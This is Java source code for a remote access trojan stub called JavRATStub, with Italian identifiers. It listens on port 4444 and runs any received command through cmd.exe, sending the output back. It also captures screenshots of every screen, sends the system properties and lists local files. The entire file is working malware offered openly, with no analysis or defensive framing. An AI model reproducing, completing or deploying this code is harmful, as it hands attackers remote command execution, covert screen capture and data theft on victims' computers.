/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template
 */
package javratstub;



import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Properties;
import javax.imageio.ImageIO;

/**
 *
 * @author rocco
 */
public class JavRATStub {

 
public static void SendFilesList(DataOutputStream dos) throws IOException{
        StringBuilder sb=new StringBuilder();
        File[] files=new File(".").listFiles(); //lists all files in current directory
        for(File file:files){
               sb.append(file.getName()+ " ");
           }
        dos.writeUTF(sb.toString());
}
public static DataOutputStream InviaScreenshot(DataOutputStream imdos) throws Exception {
    GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
    GraphicsDevice[] screens = ge.getScreenDevices();
    Rectangle allScreenBounds = new Rectangle();
    for (GraphicsDevice screen : screens) {
        Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
        allScreenBounds.width += screenBounds.width;
        allScreenBounds.height = Math.max(allScreenBounds.height, screenBounds.height);
    }
    BufferedImage capture = new Robot().createScreenCapture(allScreenBounds);
    ImageIO.write(capture, "bmp", imdos);
    return imdos;
}

    private static String Esegui(String comando) throws IOException {
        StringBuilder builder = new StringBuilder();
        Process process = Runtime.getRuntime().exec(comando);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line = "";
        while ((line = reader.readLine()) != null) {
            builder.append(line).append('\n');
        }
        return builder.toString();
    }
private static void GetInfo(DataOutputStream dos) throws IOException{
      Properties prop = System.getProperties();
      GsonBuilder gson_builder=new GsonBuilder();
      Gson gson=gson_builder.setPrettyPrinting().create();
      dos.writeUTF(gson.toJson(prop));
}
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException, Exception {
        // TODO code application logic here
        ServerSocket ss = new ServerSocket(4444);
        Runtime runtime = Runtime.getRuntime();
        Socket s = ss.accept();
        String comando="";
        String risp;
        while (true) {
            DataInputStream dis = new DataInputStream(s.getInputStream());
            DataOutputStream dos = new DataOutputStream(s.getOutputStream());
            try {
                comando = "cmd.exe /c " + dis.readUTF();
            } catch (Exception e) {
                dis.close();
                dos.close();
                s.close();
                System.exit(0);
            }
            if (comando.isEmpty()) {
                dis.close();
                s.close();
                System.exit(0);
            }
            if(comando.contains("screenshot")){
                InviaScreenshot(dos);
            }
            if(comando.contains("info")){
                GetInfo(dos);
            }
            if(comando.contains("files_list")){
                SendFilesList(dos);
            }
            if ((comando.startsWith("esci"))) {
                dis.close();
                s.close();
                System.exit(0);
            }
            try {
                dos.writeUTF(Esegui(comando));
                comando = "";
            } catch (IOException exc) {
            }
        }

    }
}
